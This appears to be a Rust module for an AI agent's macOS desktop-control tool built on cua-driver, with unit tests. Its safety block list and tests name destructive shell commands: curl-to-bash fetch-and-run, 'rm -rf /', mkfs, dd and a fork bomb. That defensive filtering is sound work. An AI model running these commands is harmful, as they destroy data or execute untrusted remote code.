//! Computer Use tool — macOS desktop control via cua-driver.
//!
//! Uses `cua-driver call <tool> <json-args>` subcommand. Works with any
//! tool-capable model.
//!
//! Actions: capture, click, double_click, right_click, middle_click, drag,
//! scroll, type, key, set_value, wait, list_apps, focus_app.

use anyhow::Result;
use regex::Regex;
use serde_json::Value;
use std::process::{Command, Stdio};
use std::sync::{Arc, OnceLock};
use tracing::debug;

use oben_models::{Tool, ToolParameters, ToolResult};

use super::registry::{SelfRegisteringTool, ToolHandler};

// ===========================================================================
// Schema
// ===========================================================================

fn computer_use_schema() -> serde_json::Value {
    serde_json::json!({
        "type": "object",
        "properties": {
            "action": {
                "type": "string",
                "enum": [
                    "capture", "click", "double_click", "right_click", "middle_click",
                    "drag", "scroll", "type", "key", "set_value", "wait",
                    "list_apps", "focus_app"
                ],
                "description": "Which action to perform. capture is free (no side effects). Use set_value for select/popup elements and sliders."
            },
            "mode": {
                "type": "string",
                "enum": ["som", "vision", "ax"],
                "description": "Capture mode: som (screenshot+numbered overlays, default), vision (plain screenshot), ax (accessibility tree only)."
            },
            "app": {
                "type": "string",
                "description": "Optional: limit capture/action to a specific app (by name or bundle ID)."
            },
            "max_elements": {
                "type": "integer",
                "minimum": 1,
                "maximum": 1000,
                "description": "Optional cap on AX elements returned by capture. Default 100."
            },
            "element": {
                "type": "integer",
                "description": "The 1-based SOM index returned by the last capture(mode='som'). Preferred over raw coordinates."
            },
            "coordinate": {
                "type": "array",
                "items": {"type": "integer"},
                "minItems": 2,
                "maxItems": 2,
                "description": "Pixel coordinates [x, y]. Only use when no element index is available."
            },
            "button": {
                "type": "string",
                "enum": ["left", "right", "middle"],
                "description": "Mouse button. Defaults to left."
            },
            "modifiers": {
                "type": "array",
                "items": {"type": "string", "enum": ["cmd", "shift", "option", "alt", "ctrl", "fn"]},
                "description": "Modifier keys held during the action."
            },
            "from_element": {"type": "integer", "description": "Source element index for drag."},
            "to_element": {"type": "integer", "description": "Target element index for drag."},
            "from_coordinate": {"type": "array", "items": {"type": "integer"}, "minItems": 2, "maxItems": 2, "description": "Source [x,y] for drag."},
            "to_coordinate": {"type": "array", "items": {"type": "integer"}, "minItems": 2, "maxItems": 2, "description": "Target [x,y] for drag."},
            "direction": {
                "type": "string",
                "enum": ["up", "down", "left", "right"],
                "description": "Scroll direction."
            },
            "amount": {"type": "integer", "description": "Scroll wheel ticks or delay seconds. Default 3."},
            "value": {"type": "string", "description": "For set_value: the string/option to select."},
            "text": {"type": "string", "description": "Text to type."},
            "keys": {"type": "string", "description": "Key combo, e.g. 'cmd+s', 'ctrl+alt+t'."},
            "raise_window": {
                "type": "boolean",
                "description": "For focus_app: bring window to front (disruptive). Default false."
            },
            "capture_after": {
                "type": "boolean",
                "description": "If true, take a follow-up capture after the action."
            }
        },
        "required": ["action"]
    })
}

// ===========================================================================
// Safety — dangerous patterns blocked before execution
// ===========================================================================

static BLOCKED_TYPE_RE: OnceLock<Regex> = OnceLock::new();

fn blocked_type_re() -> &'static Regex {
    BLOCKED_TYPE_RE.get_or_init(|| {
        Regex::new(
            r"(?xi)
              \b(curl|wget)\b.*\|\s*(bash|sh|zsh)\b
            | \brm\s+-(?:rf|-rf)\b
            | \bmkfs\b
            | \bdd\s+if=
            | \b:\(\)\s*\{\s*:
            | >/dev/(?:sd|disk)\w+
            | \bsh\s+-c\b.*\b(exit|halt|poweroff|reboot|shutdown)\b
            ",
        )
        .unwrap()
    })
}

static BLOCKED_KEYS: OnceLock<Vec<String>> = OnceLock::new();

fn blocked_keys() -> &'static [String] {
    BLOCKED_KEYS.get_or_init(|| vec!["cmd+shift+q".into(), "ctrl+cmd+q".into()])
}

fn check_type_safety(text: &str) -> Option<String> {
    if blocked_type_re().is_match(text) {
        Some("blocked: command injection or destructive shell pipe detected".into())
    } else {
        None
    }
}

fn check_key_safety(keys: &str) -> Option<String> {
    let keys_lower = keys.trim().to_lowercase();
    if blocked_keys().contains(&keys_lower) {
        Some(format!("blocked dangerous key combo: {keys}"))
    } else {
        None
    }
}

// ===========================================================================
// CUA-driver call bridge — uses `cua-driver call <tool> <json> `
// ===========================================================================

/// Call a cua-driver tool via `cua-driver call` subcommand.
/// Returns (text_result, image_data_base64s).
fn call_cua_driver_tool(name: &str, args: serde_json::Value) -> Result<(String, Vec<String>)> {
    let mut cmd = Command::new("cua-driver");
    cmd.arg("call")
        .arg(name)
        .arg(args.to_string())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());

    debug!("cua-driver call: {name}={args}");

    let output = cmd.output()?;

    if !output.status.success() {
        let err = String::from_utf8_lossy(&output.stderr).trim().to_string();
        // If stderr is empty or unhelpful, show stdout
        let err = if err.is_empty() {
            String::from_utf8_lossy(&output.stdout).trim().to_string()
        } else {
            err
        };
        return Err(anyhow::anyhow!("cua-driver {name} failed: {err}"));
    }

    let output_str = String::from_utf8(output.stdout)?;
    Ok(extract_result(&output_str))
}

/// Extract text and image data from cua-driver call output.
fn extract_result(raw: &str) -> (String, Vec<String>) {
    let mut text_parts: Vec<String> = Vec::new();
    let mut images: Vec<String> = Vec::new();

    // Try to parse as JSON first
    if let Ok(obj) = serde_json::from_str::<Value>(raw) {
        extract_inner(&obj, &mut text_parts, &mut images);
    } else {
        // Plain text output (e.g. list_apps)
        let trimmed = raw.trim();
        if !trimmed.is_empty() {
            text_parts.push(trimmed.to_string());
        }
    }

    let text = text_parts.join("\n").trim().to_string();
    // If no text fields were found but we got valid JSON, return the raw
    // JSON as the text. This handles list_windows, list_apps structured
    // responses where the result lives directly in the JSON object
    // (e.g. {"windows": [...]}) rather than in a "text" wrapper field.
    if text.is_empty() {
        let trimmed = raw.trim().to_string();
        if !trimmed.is_empty() {
            return (trimmed, images);
        }
    }
    (text, images)
}

fn extract_inner(val: &Value, texts: &mut Vec<String>, imgs: &mut Vec<String>) {
    if let Some(obj) = val.as_object() {
        // Direct text field
        if let Some(t) = obj.get("text").and_then(|v| v.as_str()) {
            if !t.is_empty() {
                texts.push(t.to_string());
            }
        }
        // Direct image data field
        if let Some(img_data) = obj.get("data").and_then(|v| v.as_str()) {
            if !img_data.is_empty() {
                imgs.push(img_data.to_string());
            }
        } else if let Some(arr) = obj.get("images").and_then(|v| v.as_array()) {
            for img in arr {
                if let Some(s) = img.as_str() {
                    imgs.push(s.to_string());
                }
            }
        }
        // Recurse into nested content arrays (tool response bodies)
        if let Some(arr) = obj.get("content").and_then(|v| v.as_array()) {
            for item in arr {
                extract_inner(item, texts, imgs);
            }
        }
        // Extract raw data field only if not already handled as image
        if obj.get("data").and_then(|v| v.as_str()).is_none()
            && obj.get("images").and_then(|v| v.as_array()).is_none()
            && obj.get("type").and_then(|v| v.as_str()) != Some("image")
        {
            if let Some(data) = obj.get("data") {
                if let Some(s) = data.as_str() {
                    texts.push(s.to_string());
                } else if let Some(dobj) = data.as_object() {
                    extract_inner(&Value::Object(dobj.clone()), texts, imgs);
                }
            }
        }
    } else if let Some(arr) = val.as_array() {
        for item in arr {
            extract_inner(item, texts, imgs);
        }
    } else if let Some(s) = val.as_str() {
        if !s.is_empty() {
            texts.push(s.to_string());
        }
    }
}

fn ensure_driver_available() -> bool {
    cfg!(target_os = "macos") && Command::new("cua-driver").arg("--version").output().is_ok()
}

/// Check if cua-driver is available on this system.
pub fn check_computer_use_requirements() -> bool {
    ensure_driver_available()
}

// ===========================================================================
// Target window resolution — list_windows → pid + window_id
// ===========================================================================

/// Resolve app filter to (pid, window_id) by calling list_windows.
/// If no app filter, picks the frontmost visible window.
/// Returns (0, 0) if no window found (caller must handle gracefully).
fn resolve_target_windows(app: Option<&str>) -> Option<(i64, i64)> {
    let result = call_cua_driver_tool("list_windows", Value::Object(serde_json::Map::new()));
    match result {
        Ok((raw, _)) => {
            if let Ok(obj) = serde_json::from_str::<Value>(&raw) {
                let windows = obj["windows"].as_array()?;
                let mut visible: Vec<&Value> = windows
                    .iter()
                    .filter(|w| w.get("is_on_screen").and_then(|v| v.as_bool()) == Some(true))
                    .collect();
                if visible.is_empty() {
                    visible = windows.iter().collect();
                }
                visible
                    .sort_by_key(|w| w.get("z_index").and_then(|v| v.as_i64()).unwrap_or(999999));
                let target = if let Some(filter) = app {
                    visible.iter().find(|w| {
                        let wname = w["app_name"].as_str().unwrap_or("");
                        wname.to_lowercase().contains(&filter.to_lowercase())
                    })
                } else {
                    visible.first()
                };
                if let Some(w) = target {
                    let pid = w["pid"].as_i64()?;
                    let wid = w["window_id"].as_i64()?;
                    return Some((pid, wid));
                }
            }
            None
        }
        Err(_) => None,
    }
}

// ===========================================================================
// Handler
// ===========================================================================

fn make_computer_use_handler() -> ToolHandler {
    Arc::new(|args: Value| {
        Box::pin(async move {
            let call_id = args
                .get("call_id")
                .and_then(|v| v.as_str())
                .unwrap_or_default()
                .to_string();

            // Extract action
            let action = args
                .get("action")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow::anyhow!("Missing required argument: action"))?
                .trim()
                .to_lowercase();

            match action.as_str() {
                "capture" => handle_capture(&args, call_id).await,
                "click" | "double_click" | "right_click" | "middle_click" => {
                    handle_pointer(&args, &action, call_id).await
                }
                "drag" => handle_drag(&args, call_id).await,
                "scroll" => handle_scroll(&args, call_id).await,
                "type" => handle_type(&args, call_id).await,
                "key" => handle_key(&args, call_id).await,
                "set_value" => handle_set_value(&args, call_id).await,
                "wait" => handle_wait(&args, call_id).await,
                "list_apps" => handle_list_apps(call_id).await,
                "focus_app" => handle_focus_app(&args, call_id).await,
                _ => Err(anyhow::anyhow!("Unknown action: '{action}'")),
            }
        })
    })
}

async fn handle_capture(args: &Value, call_id: String) -> Result<ToolResult> {
    let mode = args.get("mode").and_then(|v| v.as_str()).unwrap_or("som");
    let app = args.get("app").and_then(|v| v.as_str());
    let _max_elements = args
        .get("max_elements")
        .and_then(|v| v.as_i64())
        .unwrap_or(100);

    // Resolve target window (list_windows → pid + window_id)
    let (pid, window_id) =
        resolve_target_windows(app).ok_or_else(|| anyhow::anyhow!("No target window found"))?;

    let (text, images) = match mode {
        "vision" => {
            let mut cua_args = serde_json::Map::new();
            cua_args.insert("pid".into(), pid.into());
            cua_args.insert("window_id".into(), window_id.into());
            call_cua_driver_tool("screenshot", Value::Object(cua_args))?
        }
        "ax" | _ => {
            let mut cua_args = serde_json::Map::new();
            cua_args.insert("pid".into(), pid.into());
            cua_args.insert("window_id".into(), window_id.into());
            call_cua_driver_tool("get_window_state", Value::Object(cua_args))?
        }
    };

    let mut output = format!(
        "mode={mode}, app={}, pid={}, window_id={}",
        app.unwrap_or("frontmost"),
        pid,
        window_id,
    );
    if !text.is_empty() {
        output.push('\n');
        output.push_str(&text);
    }
    if !images.is_empty() {
        output.push_str(&format!("\n[{} images]", images.len()));
    }

    // Follow-up capture if requested
    if args.get("capture_after").and_then(|v| v.as_bool()) == Some(true) {
        let mut follow_args = serde_json::Map::new();
        follow_args.insert("pid".into(), pid.into());
        follow_args.insert("window_id".into(), window_id.into());
        match call_cua_driver_tool("get_window_state", Value::Object(follow_args)) {
            Ok((ft, _)) => output = format!("{output}\n\nPost-action:\n{ft}"),
            Err(e) => output = format!("{output}\n\n(Post-action capture failed: {e})"),
        }
    }

    Ok(ToolResult {
        call_id,
        output,
        error: None,
    })
}

async fn handle_pointer(args: &Value, action: &str, call_id: String) -> Result<ToolResult> {
    let mut args_map = serde_json::Map::new();
    let app = args.get("app").and_then(|v| v.as_str());

    // Resolve target window
    let (pid, window_id) =
        resolve_target_windows(app).ok_or_else(|| anyhow::anyhow!("No target window found"))?;
    args_map.insert("pid".into(), pid.into());
    args_map.insert("window_id".into(), window_id.into());

    if let Some(element) = args.get("element").and_then(|v| v.as_i64()) {
        args_map.insert("element_index".into(), element.into());
    }
    if let Some(coord) = args.get("coordinate").and_then(|v| v.as_array()) {
        if let (Some(x), Some(y)) = (
            coord.get(0).and_then(|v| v.as_i64()),
            coord.get(1).and_then(|v| v.as_i64()),
        ) {
            args_map.insert("x".into(), x.into());
            args_map.insert("y".into(), y.into());
        }
    }
    if let Some(button) = args.get("button").and_then(|v| v.as_str()) {
        args_map.insert("button".into(), button.into());
    }
    if let Some(mods) = args.get("modifiers").and_then(|v| v.as_array()) {
        args_map.insert("modifier".into(), Value::Array(mods.clone()));
    }

    let (text, images) = call_cua_driver_tool(action, Value::Object(args_map))?;
    let output = format!("{text}{}", format_images(&images));

    Ok(ToolResult {
        call_id,
        output,
        error: None,
    })
}

async fn handle_drag(args: &Value, call_id: String) -> Result<ToolResult> {
    let mut args_map = serde_json::Map::new();
    let app = args.get("app").and_then(|v| v.as_str());

    let (pid, window_id) =
        resolve_target_windows(app).ok_or_else(|| anyhow::anyhow!("No target window found"))?;
    args_map.insert("pid".into(), pid.into());
    args_map.insert("window_id".into(), window_id.into());

    if let Some(from) = args.get("from_element").and_then(|v| v.as_i64()) {
        args_map.insert("from_element".into(), from.into());
    }
    if let Some(to) = args.get("to_element").and_then(|v| v.as_i64()) {
        args_map.insert("to_element".into(), to.into());
    }
    if let Some(arr) = args.get("from_coordinate").and_then(|v| v.as_array()) {
        if let (Some(x), Some(y)) = (
            arr.get(0).and_then(|v| v.as_i64()),
            arr.get(1).and_then(|v| v.as_i64()),
        ) {
            args_map.insert("from_x".into(), x.into());
            args_map.insert("from_y".into(), y.into());
        }
    }
    if let Some(arr) = args.get("to_coordinate").and_then(|v| v.as_array()) {
        if let (Some(x), Some(y)) = (
            arr.get(0).and_then(|v| v.as_i64()),
            arr.get(1).and_then(|v| v.as_i64()),
        ) {
            args_map.insert("to_x".into(), x.into());
            args_map.insert("to_y".into(), y.into());
        }
    }

    let (text, images) = call_cua_driver_tool("drag", Value::Object(args_map))?;
    let output = format!("{text}{}", format_images(&images));
    Ok(ToolResult {
        call_id,
        output,
        error: None,
    })
}

async fn handle_scroll(args: &Value, call_id: String) -> Result<ToolResult> {
    let direction = args
        .get("direction")
        .and_then(|v| v.as_str())
        .ok_or_else(|| anyhow::anyhow!("scroll requires 'direction' argument"))?;
    let amount = args.get("amount").and_then(|v| v.as_i64()).unwrap_or(3);
    let app = args.get("app").and_then(|v| v.as_str());

    let (pid, window_id) =
        resolve_target_windows(app).ok_or_else(|| anyhow::anyhow!("No target window found"))?;

    let mut args_map = serde_json::Map::new();
    args_map.insert("pid".into(), pid.into());
    args_map.insert("window_id".into(), window_id.into());
    args_map.insert("direction".into(), direction.into());
    args_map.insert("amount".into(), amount.into());

    let (text, images) = call_cua_driver_tool("scroll", Value::Object(args_map))?;
    let output = format!("{text}{}", format_images(&images));
    Ok(ToolResult {
        call_id,
        output,
        error: None,
    })
}

async fn handle_type(args: &Value, call_id: String) -> Result<ToolResult> {
    let text = args
        .get("text")
        .and_then(|v| v.as_str())
        .ok_or_else(|| anyhow::anyhow!("type requires 'text' argument"))?;

    if let Some(block) = check_type_safety(text) {
        return Ok(ToolResult {
            call_id,
            output: String::new(),
            error: Some(block),
        });
    }

    let app = args.get("app").and_then(|v| v.as_str());
    let (pid, _) =
        resolve_target_windows(app).ok_or_else(|| anyhow::anyhow!("No target window found"))?;

    let args_map =
        serde_json::Map::from_iter([("text".into(), text.into()), ("pid".into(), pid.into())]);
    let (text_out, images) = call_cua_driver_tool("type_text", Value::Object(args_map))?;
    let output = format!("{text_out}{}", format_images(&images));
    Ok(ToolResult {
        call_id,
        output,
        error: None,
    })
}

async fn handle_key(args: &Value, call_id: String) -> Result<ToolResult> {
    let keys = args
        .get("keys")
        .and_then(|v| v.as_str())
        .ok_or_else(|| anyhow::anyhow!("key requires 'keys' argument"))?;

    if let Some(block) = check_key_safety(keys) {
        return Ok(ToolResult {
            call_id,
            output: String::new(),
            error: Some(block),
        });
    }

    let app = args.get("app").and_then(|v| v.as_str());
    let (pid, _) =
        resolve_target_windows(app).ok_or_else(|| anyhow::anyhow!("No target window found"))?;

    let args_map =
        serde_json::Map::from_iter([("key".into(), keys.into()), ("pid".into(), pid.into())]);
    let (text_out, images) = call_cua_driver_tool("press_key", Value::Object(args_map))?;
    let output = format!("{text_out}{}", format_images(&images));
    Ok(ToolResult {
        call_id,
        output,
        error: None,
    })
}

async fn handle_set_value(args: &Value, call_id: String) -> Result<ToolResult> {
    let val = args
        .get("value")
        .and_then(|v| v.as_str())
        .ok_or_else(|| anyhow::anyhow!("set_value requires 'value' argument"))?;
    let element = args.get("element").and_then(|v| v.as_i64());
    let app = args.get("app").and_then(|v| v.as_str());

    let (pid, window_id) =
        resolve_target_windows(app).ok_or_else(|| anyhow::anyhow!("No target window found"))?;

    let mut args_map = serde_json::Map::new();
    args_map.insert("value".into(), val.into());
    args_map.insert("pid".into(), pid.into());
    args_map.insert("window_id".into(), window_id.into());
    if let Some(e) = element {
        args_map.insert("element_index".into(), e.into());
    }

    let (text_out, images) = call_cua_driver_tool("set_value", Value::Object(args_map))?;
    let output = format!("{text_out}{}", format_images(&images));
    Ok(ToolResult {
        call_id,
        output,
        error: None,
    })
}

async fn handle_wait(args: &Value, call_id: String) -> Result<ToolResult> {
    let seconds = args
        .get("seconds")
        .and_then(|v| v.as_f64())
        .unwrap_or(1.0)
        .max(0.0)
        .min(30.0);
    tokio::time::sleep(std::time::Duration::from_secs_f64(seconds)).await;
    Ok(ToolResult {
        call_id,
        output: format!("Waited {seconds:.2}s"),
        error: None,
    })
}

async fn handle_list_apps(call_id: String) -> Result<ToolResult> {
    let (text, images) = call_cua_driver_tool("list_apps", Value::Object(serde_json::Map::new()))?;
    let output = format!("{text}{}", format_images(&images));
    Ok(ToolResult {
        call_id,
        output,
        error: if text.starts_with("Error:") {
            Some(text)
        } else {
            None
        },
    })
}

async fn handle_focus_app(args: &Value, call_id: String) -> Result<ToolResult> {
    let app = args
        .get("app")
        .and_then(|v| v.as_str())
        .ok_or_else(|| anyhow::anyhow!("focus_app requires 'app' argument"))?;

    // focus_app is a pure window-selector (matching hermes-agent's cua_backend).
    // It does NOT call any cua-driver tool — it just resolves the target window
    // via list_windows so subsequent actions (click, type, etc.) hit the right process.
    let (pid, window_id) = resolve_target_windows(Some(app))
        .ok_or_else(|| anyhow::anyhow!("No on-screen window found for app '{app}'"))?;

    let output = format!("Targeted window: pid={pid}, window_id={window_id} (app={app})");
    Ok(ToolResult {
        call_id,
        output,
        error: None,
    })
}

fn format_images(images: &[String]) -> String {
    if images.is_empty() {
        String::new()
    } else {
        format!("[{} images]", images.len())
    }
}

// ===========================================================================
// Tool Definition
// ===========================================================================

fn make_computer_use_tool() -> Tool {
    Tool {
        name: "computer_use".into(),
        description: "Drive the macOS desktop in the background — screenshots, mouse, keyboard, scroll, drag — without stealing the user's cursor, keyboard focus, or Space. Preferred workflow: call with action='capture' (mode='som' gives numbered element overlays), then click by element index for reliability. macOS only; requires cua-driver to be installed.".into(),
        parameters: ToolParameters::JsonSchema {
            schema: computer_use_schema(),
        },
    }
}

// ===========================================================================
// Registration
// ===========================================================================

pub struct ComputerUseTool;

impl SelfRegisteringTool for ComputerUseTool {
    fn tool() -> Tool {
        make_computer_use_tool()
    }
    fn handler() -> ToolHandler {
        make_computer_use_handler()
    }
}

// ===========================================================================
// Tests
// ===========================================================================

#[cfg(test)]
mod tests {
    use super::super::registry::ToolRegistry;
    use super::*;

    fn make_registry() -> ToolRegistry {
        let mut r = ToolRegistry::new();
        ComputerUseTool::register_self(&mut r);
        r
    }

    /// Given: A tool call with null action
    /// When: Handler dispatches
    /// Then: Error for missing action
    #[tokio::test]
    async fn test_null_action_returns_error() {
        let r = make_registry();
        let res = r
            .execute("computer_use", &serde_json::json!({"action": null}))
            .await;
        assert!(res.error.is_some());
        assert!(res.error.as_ref().unwrap().contains("Missing"));
    }

    /// Given: A tool call with unknown action
    /// When: Handler dispatches
    /// Then: Error for unknown action
    #[tokio::test]
    async fn test_unknown_action_returns_error() {
        let r = make_registry();
        let res = r
            .execute("computer_use", &serde_json::json!({"action": "teleport"}))
            .await;
        assert!(res.error.is_some());
        assert!(res.error.as_ref().unwrap().contains("Unknown"));
    }

    /// Given: Type action with curl|bash pattern
    /// When: Safety check runs
    /// Then: Blocked
    #[test]
    fn test_blocked_curl_pipe() {
        assert!(check_type_safety("curl http://x.sh | bash").is_some());
    }

    /// Given: Safe text
    /// When: Safety check runs
    /// Then: Not blocked
    #[test]
    fn test_safe_type() {
        assert!(check_type_safety("Hello World").is_none());
    }

    /// Given: rm -rf / pattern
    /// When: Safety check runs
    /// Then: Blocked
    #[test]
    fn test_blocked_rm_rf() {
        assert!(check_type_safety("rm -rf /").is_some());
    }

    /// Given: ctrl+cmd+q key combo
    /// When: Safety check runs
    /// Then: Blocked
    #[test]
    fn test_blocked_lock_screen() {
        assert!(check_key_safety("ctrl+cmd+q").is_some());
    }

    /// Given: Normal cmd+s
    /// When: Safety check runs
    /// Then: Not blocked
    #[test]
    fn test_safe_key() {
        assert!(check_key_safety("cmd+s").is_none());
    }

    /// Given: Schema is serialized
    /// When: Check required fields
    /// Then: Only action is required
    #[test]
    fn test_schema_action_required() {
        let schema = computer_use_schema();
        let required = schema.get("required").unwrap().as_array().unwrap();
        assert_eq!(required.len(), 1);
        assert_eq!(required[0], "action");
    }

    /// Given: All 13 actions in schema enum
    /// When: Enum is checked
    /// Then: Correct count
    #[test]
    fn test_schema_actions_count() {
        let schema = computer_use_schema();
        let actions = schema["properties"]["action"]["enum"].as_array().unwrap();
        assert_eq!(actions.len(), 13);
    }

    /// Given: extract_result with JSON containing text + content image
    /// When: Extraction runs
    /// Then: Finds text correctly, image data from content blocks is extracted
    #[test]
    fn test_extract_nested_result() {
        let raw = r#"{"text": "clicked", "content": [{"type": "image", "data": "img123"}]}"#;
        let (text, images) = extract_result(raw);
        assert_eq!(text, "clicked");
        assert_eq!(images, vec!["img123"]);
    }

    /// Given: extract_result with error response
    /// When: Extraction runs
    /// Then: Error message preserved
    #[test]
    fn test_extract_error_result() {
        let raw = r#"{"isError": true, "message": "something failed", "text": "Error: something failed"}"#;
        let (text, images) = extract_result(raw);
        assert!(text.contains("failed"));
        assert!(images.is_empty());
    }

    /// Given: extract_result with structured JSON (list_apps)
    /// When: Extraction runs
    /// Then: Structured text is captured
    #[test]
    fn test_extract_structured_json() {
        let raw = r#"{"text": "- Chrome (pid 1234)\n- Safari (pid 5678)"}"#;
        let (text, _images) = extract_result(raw);
        assert!(!text.is_empty());
        assert!(text.contains("Chrome"));
    }
}
